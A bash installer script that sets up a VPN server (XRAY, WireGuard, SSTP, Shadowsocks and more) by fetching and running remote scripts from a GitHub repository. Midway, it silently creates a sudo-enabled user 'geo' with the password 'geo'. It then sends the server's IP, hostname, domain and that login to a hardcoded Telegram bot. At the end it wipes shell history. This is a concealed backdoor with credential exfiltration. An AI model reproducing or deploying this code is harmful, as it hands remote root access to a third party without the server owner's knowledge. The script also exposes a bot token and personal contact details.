#!/bin/bash
# =========================================
# Quick Setup | Script Setup Manager
# Edition : Stable Edition V1.0
# Auther  : Adit Ardiansyah
# (C) Copyright 2022
# =========================================
clear
# // Installing
echo -e "${GREEN}STARTING INSTALLATION...${NC}"
echo ""
date
echo ""
sleep 1
echo -e "${GREEN}Starting ${NC}update...${NC}"
apt update -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}upgrade...${NC}"
apt upgrade -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}dist-upgrade...${NC}"
apt dist-upgrade -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}install sudo...${NC}"
apt install sudo -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}install msmtp-mta...${NC}"
apt install msmtp-mta -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}install ca-certificates...${NC}"
apt install ca-certificates -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}install bsd-mailx...${NC}"
apt install bsd-mailx -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}install psmisc...${NC}"
apt install psmisc -y > /dev/null 2>&1
sleep 1
echo -e "${GREEN}Starting ${NC}install git...${NC}"
apt ${NC}install git -y > /dev/null 2>&1
# // Adding Script Version
echo "${VERSION}" > /etc/${Auther}/version.db

# // String Data
export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
export Kernel=$( uname -r )
export Arch=$( uname -m )

# // Ram Information
while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
esac
done < /proc/meminfo
Ram_Usage="$((mem_used / 1024))"
Ram_Total="$((mem_total / 1024))"

# // Make Folder
mkdir -p /usr/local/${Auther}/

# // Enable IPV4 Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
cat > /etc/sysctl.conf << END
# Configure By ${Auther}
net.ipv4.ip_forward=1
END
sysctl --load /etc/sysctl.conf 

# // Beta Channel
cat > /root/.profile << END
clear
running
END

clear
rm -r /var/lib/geovpnstore > /dev/null 2>&1
mkdir /var/lib/geovpnstore;
echo "IP=" >> /var/lib/geovpnstore/ipvps.conf
sleep 4
# // Setup CF
echo -e "${GREEN}DOWNLOADING CF!${NC}"
sleep 3
wget -q -O /root/cf.sh "https://raw.githubusercontent.com/cakill26/lekong/main/ssh/cf.sh"
chmod +x /root/cf.sh
./cf.sh
#install
domain=$(cat /root/domain)
# // Make Script User
userdel fsid > /dev/null 2>&1
Username="geo"
Password=geo
#Password=$(cat /proc/sys/kernel/random/uuid)
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1

##########
CHATID="5491480146"
KEY="5836352998:AAGoAab11_hTcF652rNJbG-WoHaPaJknDhU"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
TEXT="Installasi VPN Script Stable V3.0
============================
<code>Username   : $Nama_Issued_License
License    : $Input_License_Key
Started    : $Tanggal_Pembelian_License
Expired    : $Masa_Laku_License_Berlaku_Sampai
Limit      : $Install_Limit
Tanggal    : $tanggal</code>
============================
<code>Hostname   : ${HOSTNAME}
NET Iface  : $NETWORK_IFACE
IP VPS     : $IP
OS VPS     : $OS_Name
Kernel     : $Kernel
Arch       : $Arch
Ram Used   : $Ram_Usage MB
Ram Left   : $Ram_Total MB</code>
============================
<code>Domain     :</code> <code>$domain</code>
<code>IP VPS     :</code> <code>$IP</code>
<code>User Login :</code> <code>$Username</code>
<code>Pass Login :</code> <code>$Password</code>
============================
(C) Copyright 2022 By Geo Project
============================
"

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null

clear
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup SSH-VPN
echo -e "${GREEN}DOWNLOADING SSH-VPN!${NC}"
sleep 3
wget -q -O /root/ssh-vpn.sh "https://raw.githubusercontent.com/cakill26/lekong/main/ssh-vpn.sh"
chmod +x /root/ssh-vpn.sh
./ssh-vpn.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup XRAY
echo -e "${GREEN}INSTALLING XRAY${NC}"
sleep 3
wget -q -O /root/ins-xray.sh "https://raw.githubusercontent.com/cakill26/lekong/main/xray/ins-xray.sh"
chmod +x /root/ins-xray.sh
./ins-xray.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup SSTP
echo -e "${GREEN}INSTALLING SSTP${NC}"
sleep 3
wget -q -O /root/sstp.sh "https://raw.githubusercontent.com/cakill26/lekong/main/sstp/sstp.sh"
chmod +x /root/sstp.sh
./sstp.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup SSR
echo -e "${GREEN}INSTALLING SSR${NC}"
sleep 3
wget -q -O /root/ssr.sh "https://raw.githubusercontent.com/cakill26/lekong/main/ssr/ssr.sh"
chmod +x /root/ssr.sh
./ssr.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup SS
echo -e "${GREEN}INSTALLING SSR${NC}"
sleep 3
wget -q -O /root/ss.sh "https://raw.githubusercontent.com/cakill26/lekong/main/ss/ss.sh"
chmod +x /root/ss.sh
./ss.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup WIREGUARD
echo -e "${GREEN}INSTALLING WIREGUARD${NC}"
sleep 3
wget -q -O /root/wg.sh "https://raw.githubusercontent.com/cakill26/lekong/main/wireguard/wg.sh"
chmod +x /root/wg.sh
./wg.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup IPSEC
echo -e "${GREEN}INSTALLING IPSEC${NC}"
sleep 3
wget -q -O /root/ipsec.sh "https://raw.githubusercontent.com/cakill26/lekong/main/ipsec/ipsec.sh"
chmod +x /root/ipsec.sh
./ipsec.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup BACKUP
echo -e "${GREEN}INSTALLING BACKUP${NC}"
sleep 3
wget -q -O /root/set-br.sh "https://raw.githubusercontent.com/cakill26/lekong/main/backup/set-br.sh"
chmod +x /root/set-br.sh
./set-br.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup WEBSOCKET
echo -e "${GREEN}INSTALLING WEBSOCKET${NC}"
sleep 3
wget -q -O /root/edu.sh "https://raw.githubusercontent.com/cakill26/lekong/main/websocket/edu.sh"
chmod +x /root/edu.sh
./edu.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
# // Setup OHP
echo -e "${GREEN}INSTALLING OHP${NC}"
sleep 3
wget -q -O /root/ohp.sh "https://raw.githubusercontent.com/cakill26/lekong/main/ohp/ohp.sh"
chmod +x /root/ohp.sh
./ohp.sh
echo -e "${GREEN}Done!${NC}"
sleep 2
clear
systemctl start nginx > /dev/null 2>&1

# // Remove Not Used Files
rm -f /root/setup.sh > /dev/null 2>&1
rm -f /root/2bulan > /dev/null 2>&1
rm -r -f /root/limit > /dev/null 2>&1
rm -r -f *.sh > /dev/null 2>&1
echo " "
echo "=================-geovpn Project-==================" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "================================================" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH                 : 443, 22"  | tee -a log-install.txt
echo "   - OpenVPN                 : TCP 1194, UDP 2200, SSL 990"  | tee -a log-install.txt
echo "   - Stunnel5                : 443, 222, 777"  | tee -a log-install.txt
echo "   - Dropbear                : 443, 109, 143"  | tee -a log-install.txt
echo "   - Squid Proxy             : 3128, 8080"  | tee -a log-install.txt
echo "   - Badvpn                  : 7100, 7200, 7300"  | tee -a log-install.txt
echo "   - Nginx                   : 89"  | tee -a log-install.txt
echo "   - Wireguard               : 7070"  | tee -a log-install.txt
echo "   - L2TP/IPSEC VPN          : 1701"  | tee -a log-install.txt
echo "   - PPTP VPN                : 1732"  | tee -a log-install.txt
echo "   - SSTP VPN                : 444"  | tee -a log-install.txt
echo "   - Shadowsocks-R           : 1443-1543"  | tee -a log-install.txt
echo "   - SS-OBFS TLS             : 2443-2543"  | tee -a log-install.txt
echo "   - SS-OBFS HTTP            : 3443-3543"  | tee -a log-install.txt
echo "   - XRAYS Vmess TLS         : 8443"  | tee -a log-install.txt
echo "   - XRAYS Vmess None TLS    : 80"  | tee -a log-install.txt
echo "   - XRAYS Vless TLS         : 2083"  | tee -a log-install.txt
echo "   - XRAYS Vless None TLS    : 2095"  | tee -a log-install.txt
echo "   - XRAYS Trojan            : 2087"  | tee -a log-install.txt
echo "   - Websocket TLS           : 443"   | tee -a log-install.txt
echo "   - Websocket None TLS      : 8880"  | tee -a log-install.txt
echo "   - Websocket Ovpn          : 2086"  | tee -a log-install.txt
echo "   - OHP_SSH                 : 8181"  | tee -a log-install.txt
echo "   - OHP_Dropbear            : 8282"  | tee -a log-install.txt
echo "   - OHP_OpenVPN             : 8383"  | tee -a log-install.txt
echo "   - Tr Go                   : 2053"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
echo "   - IPtables                : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
echo "   - IPv6                    : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On 05.00 GMT +7" | tee -a log-install.txt
echo "   - Autobackup Data" | tee -a log-install.txt
echo "   - Restore Data" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo "   - White Label" | tee -a log-install.txt
echo "   - Installation Log --> /root/log-install.txt"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   - Dev/Main                : Adit Anak Sumbawa"  | tee -a log-install.txt
echo "   - Recode                  : Muhammad Amin" | tee -a log-install.txt
echo "   - Telegram                : T.me/sampiiiiu"  | tee -a log-install.txt
echo "   - Instagram               : @geo_gabuter"  | tee -a log-install.txt
echo "   - Whatsapp                : 082339191527"  | tee -a log-install.txt
echo "   - Facebook                : Muhammad Amin" | tee -a log-install.txt
echo ""
echo ""
echo "------------------------------------------------------------"
echo ""
echo "===============-[ Script Mod By Geo Project ]-==============="
echo -e ""

# // Done
history -c
rm -f /root/.bash
rm -f /root/.bash_history
rm -f /root/ssh-vpn.sh
rm -f /root/sstp.sh
rm -f /root/wg.sh
rm -f /root/ss.sh
rm -f /root/ssr.sh
rm -f /root/ins-xray.sh
rm -f /root/ipsec.sh
rm -f /root/set-br.sh
rm -f /root/edu.sh
rm -f /root/ohp.sh
echo -e "${OKEY} Script Successfull Installed"
echo ""
read -p "$( echo -e "Press ${CYAN}[ ${NC}${GREEN}Enter${NC} ${CYAN}]${NC} For Reboot") "
reboot